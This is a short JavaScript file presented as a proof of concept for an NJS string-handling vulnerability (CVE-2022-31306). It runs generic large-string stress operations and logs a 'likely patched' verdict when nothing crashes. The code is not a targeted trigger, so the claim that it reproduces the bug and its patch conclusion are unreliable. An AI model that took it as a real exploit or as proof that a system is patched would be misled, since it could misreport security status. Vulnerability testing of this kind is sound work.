// CVE-2022-31306 Proof of Concept
// Target: NJS versions with string manipulation vulnerabilities
// Type: String operation buffer overflow

function main() {
    console.log("Starting CVE-2022-31306 reproduction...");
    
    try {
        // Create large strings for manipulation
        const baseString = "A".repeat(10000);
        const patternString = "B".repeat(1000);
        
        // String operations that may trigger vulnerability
        console.log("Testing String.prototype.replace()...");
        let result = baseString;
        
        // Multiple replace operations
        for (let i = 0; i < 100; i++) {
            result = result.replace(/A{10}/g, patternString);
            if (result.length > 1000000) break; // Prevent infinite growth
        }
        
        console.log("Testing String.prototype.split()...");
        const longString = "x".repeat(100000);
        const splitResult = longString.split("x");
        
        console.log("Testing String.prototype.substring()...");
        const substringResults = [];
        for (let i = 0; i < 1000; i++) {
            const start = Math.floor(Math.random() * longString.length);
            const end = Math.min(start + 1000, longString.length);
            substringResults.push(longString.substring(start, end));
        }
        
        console.log("Testing String.prototype.slice()...");
        const sliceResults = [];
        for (let i = 0; i < 1000; i++) {
            const start = -Math.floor(Math.random() * 1000);
            const end = Math.floor(Math.random() * 1000);
            sliceResults.push(longString.slice(start, end));
        }
        
        // String concatenation stress test
        console.log("Testing string concatenation...");
        let concatResult = "";
        for (let i = 0; i < 10000; i++) {
            concatResult += String.fromCharCode(65 + (i % 26));
            if (concatResult.length > 500000) break;
        }
        
        // String method chaining
        console.log("Testing string method chaining...");
        const chainResult = baseString
            .toLowerCase()
            .toUpperCase()
            .replace(/A/g, "B")
            .split("B")
            .join("C")
            .repeat(10);
        
        // String comparison operations
        console.log("Testing string comparisons...");
        const compareString = "Z".repeat(50000);
        const compareResults = [];
        for (let i = 0; i < 1000; i++) {
            compareResults.push(baseString.localeCompare(compareString));
        }
        
        // String search operations
        console.log("Testing string search operations...");
        const searchResults = [];
        for (let i = 0; i < 100; i++) {
            const needle = "A".repeat(i + 1);
            searchResults.push(longString.indexOf(needle));
            searchResults.push(longString.lastIndexOf(needle));
        }
        
        console.log("CVE-2022-31306: String manipulation operations completed");
        console.log("Final result length:", result.length);
        console.log("Split result length:", splitResult.length);
        console.log("Chain result length:", chainResult.length);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();